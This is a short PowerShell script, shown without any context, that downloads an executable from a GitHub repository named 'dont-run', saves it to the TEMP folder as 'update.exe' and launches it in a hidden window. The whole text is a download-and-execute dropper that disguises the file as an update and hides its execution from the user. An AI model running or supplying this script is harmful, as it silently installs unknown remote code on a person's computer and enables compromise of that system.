$url = "https://github.com/57617/dont-run/raw/refs/heads/main/wa.exe" 
$output = "$env:TEMP\update.exe"
(New-Object Net.WebClient).DownloadFile($url, $output)
Start-Process $output -WindowStyle Hidden
